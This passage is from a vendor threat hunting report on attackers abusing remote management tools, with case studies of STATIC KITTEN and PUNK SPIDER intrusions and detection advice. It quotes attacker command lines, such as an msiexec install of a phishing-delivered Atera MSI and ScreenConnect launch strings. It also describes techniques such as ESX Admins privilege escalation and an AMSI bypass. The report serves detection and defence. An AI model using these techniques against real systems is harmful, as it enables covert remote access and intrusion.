 ► 27% of all interactive intrusions used RMM tools (July 2023\-June 2024\)

CROWDSTRIKE 2024 THREAT HUNTING REPORT 
32

In 2022, the self\-hosted remote desktop software application ConnectWise 

ScreenConnect (formerly known as ConnectWise Control) was the second 

most frequently observed RMM tool — over the past year, ScreenConnect 

use increased 156%, making it the most observed RMM tool.

Targeted intrusion adversary FAMOUS CHOLLIMA has frequently 

employed AnyDesk in their operations throughout the past year, and this tool 

has also remained highly popular with numerous eCrime adversaries, including 

SCATTERED SPIDER, MANGLED SPIDER, PUNK SPIDER and BITWISE SPIDER. 

Adversaries have increasingly used RMM tools for the following reasons:

 ► RMM tools do not require licenses for “non\-commercial” applications.

 ► The tools offer stability, professional GUI and robust capabilities.

 ► RMM tools provide detection evasion, particularly in environments where IT 

departments use RMM tools for business purposes.

In most cases, adversaries only deploy RMM tools after achieving initial access. 

These tools allow actors to maintain persistence after successfully compromising 

systems via other methods, including through compromised credentials. 

In some cases, the adversary uses the RMM tool as their initial point of access. 

CHEF SPIDER used this tactic in May 2024, leveraging RMM tools delivered via 

social engineering to gain initial access to a network.

Within minutes of the CHEF SPIDER intrusion, CrowdStrike OverWatch threat hunters responded to 

a lead for an Outlook process spawning a web browser that contacted a suspicious domain. It took 

approximately eight minutes for CrowdStrike OverWatch to reconstruct the activity, confirm the activity 

was likely malicious and link the activity to CHEF SPIDER. During this time, hunters gathered initial 

information to assist defenders with their investigation and then sent a notification to Falcon Complete. 

While Falcon Complete began remediation efforts with the customer, CrowdStrike OverWatch continued 

to monitor activity for any attempts by CHEF SPIDER to move laterally or gain a stronger foothold. Minutes 

after the intrusion began, CrowdStrike OverWatch disrupted CHEF SPIDER’s intrusion attempt.

 CASE STUDY: 

Hunting the 
STATIC KITTEN Adversary 

Targeted intrusion adversaries, including prolific Iran\-based 

adversary STATIC KITTEN, also continue to rely on RMM tooling 

in their operations. STATIC KITTEN routinely relies on RMM tools 

for persistence within target networks, and during the past year, 

CrowdStrike OverWatch observed the adversary using multiple RMM 

tools, including Atera, Level.io, SimpleHelp, ScreenConnect, Tactical 

RMM and Action1\. 

In March 2024, STATIC KITTEN engaged in phishing activity to deliver 

ScreenConnect and Atera to government, telecom and technology 

entities in the Middle East and South Asia. In June 2024, STATIC 

KITTEN continued using the Atera RMM tool during a spear\-phishing 

campaign against a healthcare entity in the Middle East, marking the 

latest in their series of operations using RMM tools to target Middle 

East\-based entities. 

In June 2024, CrowdStrike OverWatch observed STATIC KITTEN 

employ spear\-phishing emails to target a healthcare organization in 

the Middle East. CrowdStrike OverWatch threat hunters observed the 

adversary download suspicious ZIP files from a cloud storage platform 

on two hosts. Executing the ZIP file resulted in subsequent execution 

of an MSI file. The MSI file was an installer for the Atera Agent remote 

management software. 

CMD : "C:\\WINDOWS\\System32\\msiexec.exe" /i 

"C:\\Users\\\[REDACTED\-USERNAME] 

\\AppData\\Local\\Temp\\Temp1\_srca.zip\\srca.msi"

CROWDSTRIKE 2024 THREAT HUNTING REPORT 
34

Following the initial notification, CrowdStrike OverWatch observed 

at least six additional hosts attempting to retrieve the malicious ZIP 

from the same cloud storage location, likely indicating that other users 

received the same targeted phishing emails. These attempts did not 

result in successful download of malicious tooling.

STATIC KITTEN’s use of legitimate RMM tools delivered via MSI can 

present a challenge for threat hunters and defenders. Executing MSI 

files via msiexec.exe is a standard Windows execution method, 
resulting in a significant amount of data to analyze. Determining which 

processes may be malicious by process name alone can be time\-

consuming. 

Even narrowing a search to include only RMM software installers may 

not yield results, as adversaries such as STATIC KITTEN will often 

rename the installer file. 

To identify RMM tool execution (such as Atera Agent), CrowdStrike 

OverWatch threat hunters search for command lines containing 

integrator login account details in the form of email addresses. 

Additionally, CrowdStrike OverWatch focuses on STATIC KITTEN’s 

common delivery methods. The adversary regularly downloads tooling 

from cloud service providers; another way to detect STATIC KITTEN 

is by hunting for web browser processes containing single\-argument 

command lines to cloud storage services. Organizations with 

embedded threat hunting teams can further narrow their search 

criteria by identifying which RMM and cloud storage services are 

expected in their environment. 

STATIC KITTEN routinely changes TTPs and operational cadence 

for each campaign, but CrowdStrike OverWatch threat hunters have 

observed that STATIC KITTEN often recycles techniques — albeit with 

variations — in each campaign. For example, the adversary may update 

or rewrite their custom tooling, but the execution method may remain 

the same. Alternatively, while STATIC KITTEN may use a new RMM 

tool, they may use the same cloud storage provider to deliver the tool 

to a targeted host. CrowdStrike OverWatch threat hunters collaborate 

closely with the larger CrowdStrike Counter Adversary Operations team 

to track adversaries such as STATIC KITTEN by understanding their 

actions across their entire kill chain.

CROWDSTRIKE 2024 THREAT HUNTING REPORT 
35

To hunt for and protect against RMM threats, 

CrowdStrike recommends the following measures:

 ► Establish a baseline of approved RMM software and expected RMM users 

in your organization by collaborating with relevant stakeholders such as IT 

services. Thoroughly investigate unexpected RMM tools or users. 

 ► Establish a baseline of expected legitimate RMM tool behavior. Profile normal 

directory paths, remote connection domains, remote IP addresses and files written 

by RMM tools. For example, AnyDesk normally writes a file named gcapi.dll; files with 
other names may be malicious. Define expected child and grandchild process trees. 

 ► Monitor for known RMM tool\-related filenames, file paths or process names. 

Though some adversaries rename RMM tools, less sophisticated adversaries do not. 

 ○ For example, ScreenConnect’s network deployer is named 

ScreenConnectClientNetworkDeployer.exe by default. TeamViewer’s core 
process is named TeamViewer\_Desktop.exe by default, and the main GUI process is 
named TeamViewer.exe. AnyDesk is installed to C:\\ProgramData\\AnyDesk\\AnyDesk.exe 
by default.

 ► Monitor for or block access to main service provider domains hosting RMM tools 

(e.g., download.teamviewer\[.]com).

 ► Monitor for anomalous DNS requests and network connections typical of unexpected RMM tools.

 ► Monitor process trees for anomalous parameters and flags typical of unexpected RMM tools: 

 ○ ConnectWise ScreenConnect uses numerous launch parameters, including e, y, h, p, s, k, t 

and c (see Figure 11\).

 ○ ConnectWise ScreenConnect can run manual shell commands that manifest as .cmd 

scripts with filenames ending in run.cmd 
(e.g., "cmd.exe" /c "C:\\Windows\\TEMP\\ScreenConnect\\\\run.cmd"). 

 ○ AnyDesk command line installers (EXE and MSI versions) run with the –install flag, and 

adversaries typically install AnyDesk with the –silent flag.

"C:\\Program Files (x86\)\\ScreenConnect Client 

(\[uuid])\\ScreenConnect.ClientService.exe"

\&c\=\&c\=\&c\=\&c\=\&c\=\&c\="

Figure 11\. ScreenConnect launch process example

 ► Search for artifacts (such as logs) that RMM tools write to disk. 

For example, AnyDesk artifacts are written to C:\\ProgramData\\AnyDesk\\ or 
C:\\Users\\%Username%\\Appdata\\Roaming\\AnyDesk\\ by default. ConnectWise typically writes files 
to C:\\Program Files (x86\)\\ScreenConnect Client (\[uuid])\\.

Countering 
the Adversary 

Hunting and countering today’s adversaries requires speed, accuracy and 

human ingenuity — and CrowdStrike delivers all three. As adversaries continue 

to evolve, threat hunters have to apply creative and lateral thinking to ensure 

they maintain the speed and accuracy necessary to outpace the adversary. 

The CrowdStrike 2024 Global Threat Report identified that the average 

breakout time for an eCrime adversary was 62 minutes in 2023\. Breakout time 

refers to the average time it takes an adversary to move laterally within a victim 

network after gaining access. For most organizations, 62 minutes is a very 

narrow window to disrupt the adversary before they embed, which is where 

the support of CrowdStrike OverWatch’s cutting\-edge threat hunting bridges 

the gap.

To highlight the importance of speed, accuracy and human ingenuity when 

hunting and countering the adversary at every turn, the following interactive 

intrusion case study examines an attack by one of the most prevalent and 

fast\-moving eCrime adversaries: PUNK SPIDER. 

When accessing victims’ network environments, PUNK SPIDER typically 

operates quickly to identify and exfiltrate sensitive data and deploy Akira 
ransomware, requiring an urgent response from network defenders. 

In this incident, the Falcon sensor immediately detected the adversary, 

and CrowdStrike OverWatch and Falcon Complete prevented PUNK SPIDER 

from impacting the victim.

 CASE STUDY: 

Hunting PUNK SPIDER

PUNK SPIDER has emerged as one of the most prevalent and fastest 

adversaries that CrowdStrike OverWatch has observed over the past year. 

First identified in April 2023, PUNK SPIDER is a BGH adversary that develops 
and maintains the Akira ransomware and the associated Akira dedicated leak 
site (DLS). Similar to many other BGH actors, PUNK SPIDER leverages sensitive 

data exfiltration and encryption to extort ransom payments from victims.

In April 2024, CrowdStrike OverWatch and Falcon Complete identified 

suspected PUNK SPIDER activity at a North American technology company. 

Together — and supplemented with information from the victim — CrowdStrike 

identified that PUNK SPIDER had accessed the victim’s network environment 
through an unmanaged3 Palo Alto Networks GlobalProtect VPN appliance 

vulnerable to CVE\-2024\-3400 exploitation. The first evidence of adversary 

activity was when PUNK SPIDER used a service account to log on to another 

network host via Remote Desktop Protocol (RDP), causing the Falcon sensor 

to immediately alert CrowdStrike OverWatch to potential malicious activity. 

PUNK SPIDER then attempted to dump credentials and deploy legitimate 

proxy\-tunneling and remote access tools to establish persistence.

The adversary attempted to elevate their privileges by adding compromised 

and adversary\-created user accounts to local administrator groups and the 

ESX Admins group. PUNK SPIDER commonly uses this technique to gain privileged 

access to ESXi devices, as members of the ESX Admins group automatically have 

administrative access to all ESXi devices in the same Active Directory domain. 

However, the Falcon sensor blocked these privilege escalation attempts. 

In communication with the victim, Falcon Complete began containing 

compromised accounts and devices to prevent PUNK SPIDER from 

adversely affecting the victim’s operations. 

PUNK SPIDER attempted to use the open\-source reconnaissance tool 
SharpShares to enumerate network shares — the adversary regularly identifies 
network shares before exfiltrating data and deploying their proprietary Akira 
ransomware. When the Falcon sensor prevented this execution, the adversary 

attempted to use an Antimalware Scan Interface (AMSI) bypass to execute 

Invoke\-ShareFinder.ps1, another network share reconnaissance 
tool — and the Falcon sensor also prevented this execution. PUNK SPIDER 
attempted to execute Akira ransomware on compromised devices, and the 
Falcon sensor prevented the Akira ransomware from encrypting any files. 

Running out of time, PUNK SPIDER used WinRAR to collect and archive data 

and attempted to use FileZilla to exfiltrate the file archives. When countering 

a known adversary such as PUNK SPIDER, Falcon Complete leverages tactical 

custom IOAs and applies them to the customer environment. This prevented 

PUNK SPIDER from using FileZilla to exfiltrate data.

Throughout the incident, CrowdStrike OverWatch and Falcon Complete identified 

PUNK SPIDER\-associated user accounts and network traffic and ultimately terminated their 

access to the victim, preventing the adversary from exfiltrating data and deploying ransomware. 

Adversaries such as PUNK SPIDER will continue to push the limits of their capabilities to achieve 

their actions on objectives, often returning to the same target and attempting a new approach. 

However, CrowdStrike OverWatch is always one step ahead, constantly improving advanced detections 

and gaining insights into adversary behaviors.

Conclusion

This report shares the perspectives and insights that CrowdStrike 

OverWatch threat hunters gain during interactive intrusion attempts on 

a daily basis. As technology evolves and security strategies improve, 

adversaries are becoming stronger, smarter and faster. From cross\-domain 

proficiency to identity\-based attacks and cloud targeting, adversaries 

continuously strive to widen their reach and deepen their impact. 

While adversaries seek weaknesses and search for creative ways to 

avoid detection, the CrowdStrike OverWatch team is similarly sharpening 

its tools and narrowing its focus. When attackers and defenders battle 

over operational sophistication and tradecraft, speed often becomes 

the tiebreaker.

As adversaries gain access to victims more quickly and shift gears 

when necessary to navigate new security challenges, defenders race to 

maintain the advantage. To increase their speed, attackers and defenders 

leverage all available tools, including AI. However, attackers have only 

recently leveraged AI to conduct faster, more sophisticated attacks, 

whereas CrowdStrike has long been using AI to predict adversary 

behavior and significantly improve protection.

Since its 2011 founding, CrowdStrike has been at the forefront of machine 

learning and AI innovation in cybersecurity, and it will continue to pioneer 

in this space. CrowdStrike’s AI is trained on trillions of security events and 

augmented with continuous feedback from CrowdStrike OverWatch threat 

hunters and intelligence experts. CrowdStrike regularly uses AI to:

 ► Combat increasingly sophisticated attacks by identifying adversary 

behavior and threat patterns.

 ► Solve hyperscale data challenges by analyzing intelligence and threat 

telemetry with speed and at scale.

 ► Automate repetitive security tasks and unleash machine\-speed 

intelligence to automate detection and response.

In 2021, CrowdStrike OverWatch patented a hunting tool 
that detects security violations.4 The tool employs AI to predict 

whether an event is malicious based on the command line’s ancestry. 

Using three distinct AI models to identify behaviors associated 

with malware and targeted intrusion activity, the tool supports both 

hunting lead generation and optimization. It classifies hunting leads, 

funneling only relevant data for threat hunters and ensuring that 

hunters can operate at scale quickly to identify an intrusion at its 

earliest stages. 

In today’s challenging threat landscape, tooling is imperative — and AI 

is just one tool in an arsenal that empowers CrowdStrike OverWatch 

threat hunters. CrowdStrike OverWatch continuously harnesses 

cutting\-edge technologies to enhance defenses and stop adversaries 

in their tracks. 

But tooling alone is not enough to thwart today’s sophisticated 

adversaries. While CrowdStrike OverWatch threat hunters work 

relentlessly to detect and disrupt adversaries, CrowdStrike Counter 

Adversary Operations — and the extended CrowdStrike team — 

provide additional layers of human expertise and a unified security 

approach to stop even the stealthiest of adversaries.

Adversaries aren't stopping, and neither are we. Together, we can 

outsmart and outpace today's most sophisticated threats. We have 

never been more committed to stopping breaches and building a 

more resilient future together.
